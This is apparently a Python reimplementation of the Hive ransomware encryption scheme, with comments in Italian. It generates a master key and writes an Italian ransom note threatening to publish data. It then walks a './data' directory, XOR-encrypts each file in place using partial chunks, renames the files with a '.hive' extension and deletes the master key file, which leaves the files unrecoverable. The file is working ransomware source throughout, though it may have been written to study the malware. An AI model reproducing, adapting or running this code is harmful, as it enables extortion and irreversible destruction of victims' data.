import os
import gc
import Crypto
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import hashlib
from base64 import urlsafe_b64encode, urlsafe_b64decode

def base64UrlEncode(data):
    return urlsafe_b64encode(data).rstrip(b'=')

def base64UrlDecode(base64Url):
    padding = b'=' * (4 - (len(base64Url) % 4))
    return urlsafe_b64decode(base64Url + padding)

def create_masterkey(cipher):
    file_size = 10 * 1024 * 1024 # Dimensione 10 MiB
    ciphertext = os.urandom(file_size) #int_key = int.from_bytes(os.urandom(file_size), byteorder='big') 
    #print(type(ciphertext))
    #ciphertext = cipher.encrypt(str(int_key))

    print(hashlib.md5(ciphertext).digest())
    print(bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())))

    mkey_name = bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())).decode('utf-8') + '.key.hive' #baseurl64(MD5(encrypted_masterkey)).key.hive

    with open(mkey_name, 'wb') as f:
        f.write(ciphertext)
    gc.collect()
    return mkey_name

def open_masterkey(key_name):
    with open(key_name,'rb') as f:
        return f.read()

def create_ransomnote():
    note = "Il tuo sistema e' stato compromesso. Paga il riscatto o i tuoi dati saranno pubblicati sul nostro sito."
    with open('nota_di_riscatto.txt','w') as f:
        f.write(note)
    gc.collect()

def take_keystream(mkey,offset,size):
    return mkey[offset:offset+size]

def NBS_size_calc(FS):
    T: int = 0
    NBS: int = None
    if(FS <= 0x1000): # < 4KiB
        T = 0
    elif(FS > 0x1000 and FS <= 0x20000): # < 128KiB
        T =  FS>>12
    elif(FS > 0x20000 and FS <= 0x100000): # < 1MiB
        T = ((FS>>12)*30)/100
    elif(FS > 0x100000 and FS <= 0xA00000): # < 10MiB
        T = ((FS>>12)*20)/100
    elif(FS > 0xA00000 and FS <= 0x6400000): # < 100MiB
        T = ((FS>>12)*10)/100
    elif(FS > 0x6400000 and FS <= 0x40000000): # < 1GiB
        T = ((FS>>12)*5)/100
    else: # > 1GiB
        T = ((FS>>12)*1)/100
    #----------------- calcoliamo NBS
    if (T == 1):
        NBS = 0
    else:
        NBS = (FS-(T<<12))/(T-1)
    print("NBS = ", NBS)
    gc.collect()
    return NBS       

def create_EKS(ks1,ks2):
    EKS = bytearray(0xFFFFF)
    for i in range(0,0xFFFFF):
        EKS[i] = ks1[i] ^ ks2[i%0x400]
    gc.collect()
    return EKS

def full_encrypting(file, ks1, ks2):
    file_stats = os.stat(file)
    encrypted_file = bytearray(file_stats.st_size)
    #• EKS[i]← Keystream1[i] L Keystream2[i%0x400] (i← 0,1,· · · ,0xFFFFF)
    EKS = create_EKS(ks1,ks2)

    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())
        
    for i in range(0,file_stats.st_size):
        encrypted_file[i] = fileinbytes[i] ^ EKS[i%0x100000]
    gc.collect()
    return encrypted_file

def chunk_encrypting(file, ks1, ks2, NBS):
    file_stats = os.stat(file)
    encrypted_file = [] #bytearray(file_stats.st_size)
    EKS = create_EKS(ks1,ks2)
    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())

    my_size = file_stats.st_size
    chunks = []
    flag_enc = True
    current = 0
    
    while my_size > 0:
        if (flag_enc):
            chunks.append([True, fileinbytes[int(current):int(current+0x1000)], current, current+0x1000])
            my_size -= int(0x1000)
            current += int(0x1000)
            flag_enc = not flag_enc
        else:
            chunks.append([False, fileinbytes[int(current):int(current+NBS)]])
            my_size -= int(NBS)
            current += int(NBS)
            flag_enc = not flag_enc

    print(len(chunks))

    if(len(chunks[-1][1]) > int(0x1000)):
        print("Last chunk > 0x1000")
        addition = chunks[-1][1][:0x1000]
        remainder = chunks[-1][1][0x1000:]
        chunks[-1][1] = remainder
        chunks[-2][1] = addition
    
    for c in chunks:
        if c[0]:
            arr = []
            for i in range(c[2],c[3]):
                arr.append(fileinbytes[i]^EKS[i%0x100000])
            encrypted_file.extend(arr)
        else:
            encrypted_file.extend(list(c[1]))
    gc.collect()
    return encrypted_file


def list_files(dir):
    # Create an empty list to store the paths of all files in all subdirectories
    file_paths = []

    # Walk through all subdirectories and append the path of every file to file_paths
    for root, directories, files in os.walk(dir):
        for filename in files:
            # Join the root path and the filename to create the full file path
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
    gc.collect()
    return file_paths

#Fase 3: generazione keystream

#encrypted_lorem = full_encrypting('./lorem.txt', keystream1, keystream2)

def str_bitwiseor(a,b):
    if (len(a) > len(b)):
        while(len(b) < len(a)):
            b = '0' + b
    else:
        while(len(a) < len(b)):
            a = '0' + a
    s = ""
    for i in range(0,len(a)):
        #print(a[i]+" | "+b[i] +" = ",str(int(a[i]) | int(b[i])))
        s = s + str(int(a[i])|int(b[i]))
    return s

def split_into_eight(string):
    length = len(string)
    num_blocks = length // 8
    blocks = []
    for i in range(num_blocks):
        start = i * 8
        end = start + 8
        blocks.append(string[start:end])

    if length % 8 > 0:
        blocks.append(string[num_blocks*8:])

    return blocks


def hive_ransomware():
    key_pair = RSA.generate(2048)

    RSA_public_key = key_pair.publickey().exportKey()
    RSA_private_key = key_pair.exportKey()
    cipher = PKCS1_OAEP.new(RSA_public_key)

    #Fase 1: creazione della master key
    key_name = create_masterkey(cipher)
    #Fase 2: creazione del messaggio di riscatto
    create_ransomnote()
    root = "./data"
    for file in list_files(root):
        print("file_name = ", os.path.join(root, file))
        print("file_size = ", os.stat(file).st_size)

        R1 = int.from_bytes(os.urandom(8),"little")
        R2 = int.from_bytes(os.urandom(8),"little")
        keystream1 = bytearray(take_keystream(open_masterkey(key_name), R1 % 0x900000, 1024*1024)) #Prendiamo un numero casuale di 8 byte, facciamo un'operazione di modulo con il valore 0x900000 e prendiamo da questo offset nella nostra masterkey una porzione di 1MiB.
        keystream2 = bytearray(take_keystream(open_masterkey(key_name), R2 % 0x9FFC00, 1024)) #stessa cosa di prima ma l'offset è diverso e prendiamo 1KiB

        encrypted_file = chunk_encrypting(file, keystream1, keystream2, NBS_size_calc(os.stat(file).st_size))
        with open(file,'wb') as f:
            f.write(bytearray(encrypted_file))

        file_path = os.path.join("", file)

        gc.collect()
        R1_bin = str(bin(R1))[2:]
        R2_bin = str(bin(R2))[2:]
        digest_bin = str(bin(int(hashlib.md5(open_masterkey(key_name)).hexdigest(), base=16)))[2:]
        
        bit_or_R1_R2 = str_bitwiseor(R1_bin,R2_bin)
        full_bit_or = str_bitwiseor(bit_or_R1_R2,digest_bin)
        #while (len(full_bit_or) % 8 != 0):
        #    full_bit_or = '0' + full_bit_or
        #blocks = split_into_eight(full_bit_or)
        #print(blocks)

        new_name = file + "." + str(base64UrlEncode(bytes(str(hex(int(full_bit_or,2))), encoding='utf-8')).decode('utf-8')) + ".hive"
        new_path = os.path.join("", new_name)
        print(new_path)
        os.rename(file_path, new_path)
    cleanup(key_name)

def cleanup(key_name):

    entries = os.scandir("./")

    files = [entry for entry in entries if entry.is_file() and entry.name == key_name]

    for file in files:
        os.remove(file.path)
    gc.collect()

if __name__ == '__main__':
    hive_ransomware()
